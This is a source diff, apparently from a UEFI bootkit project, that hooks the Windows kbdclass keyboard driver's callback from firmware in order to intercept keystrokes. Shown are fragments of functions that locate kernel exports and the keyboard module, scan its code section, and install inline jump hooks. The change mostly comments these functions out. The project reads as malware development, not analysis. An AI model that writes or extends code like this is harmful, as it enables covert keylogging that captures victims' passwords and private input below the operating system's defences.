@@ -21,6 +21,7 @@
 #include <Library/PrintLib.h>
 
 #include "Hook.h"
+#include "Kernel.h"
 
 /********************************************************
  * Globals
@@ -190,6 +191,7 @@ VOID DumpBytesInline(VOID* Address, UINTN Count) {
     SerialWrite("\n\r");
 }
 
+/*
 //finding function by name in Export Table
 VOID* EFIAPI FindNtosExportByName(VOID *kernelBase , CHAR8* exportName)
 {
@@ -256,7 +258,8 @@ PKLDR_DATA_TABLE_ENTRY FindKbdclassModule()
 
     return NULL;
 }
-
+*/
+/*
 //ckeck if the driver is KeyBoardDriver
 BOOLEAN IsKeyboardDriverName(UNICODE_STRING* DriverName)
 {
@@ -275,7 +278,8 @@ BOOLEAN IsKeyboardDriverName(UNICODE_STRING* DriverName)
 
     return FALSE;
 }
-
+*/
+/*
 VOID EFIAPI CheckDriverCallback(UNICODE_STRING* DriverName)
 {
     if (!DriverName || !DriverName->Buffer)
@@ -297,8 +301,9 @@ VOID EFIAPI CheckDriverCallback(UNICODE_STRING* DriverName)
         ScanForKeyboardDriver();
     }
 }
+*/
 
-
+/*
 BOOLEAN GetTextSection(VOID* ImageBase, VOID** TextBase, UINT32* TextSize)
 {
     EFI_IMAGE_DOS_HEADER* dos = (EFI_IMAGE_DOS_HEADER*)ImageBase;
@@ -324,6 +329,7 @@ BOOLEAN GetTextSection(VOID* ImageBase, VOID** TextBase, UINT32* TextSize)
 
     return FALSE;
 }
+*/
 
 VOID* FindKeyboardCallback( VOID* TextBase, UINT32 TextSize)
 {
@@ -446,7 +452,7 @@ VOID EFIAPI MyKeyboardCallbackHook(VOID* DeviceObject, KEYBOARD_INPUT_DATA* Inpu
     // *(UINT64*)(&jmpInstructions[6]) = (UINT64)g_VirtualKbdHookPtr;
     // WriteHook(g_TargetKbdAddr, jmpInstructions, 14);
 
-
+/*
 VOID ScanForKeyboardDriver()
 {
     PKLDR_DATA_TABLE_ENTRY module = FindKbdclassModule();
@@ -493,6 +499,7 @@ VOID ScanForKeyboardDriver()
     InstallKeyboardHook(callback);
     g_KeyboardFound = 0;
 }
+*/
 
 EFI_STATUS InstallPureAsmHook(VOID* TargetFunction)
 {
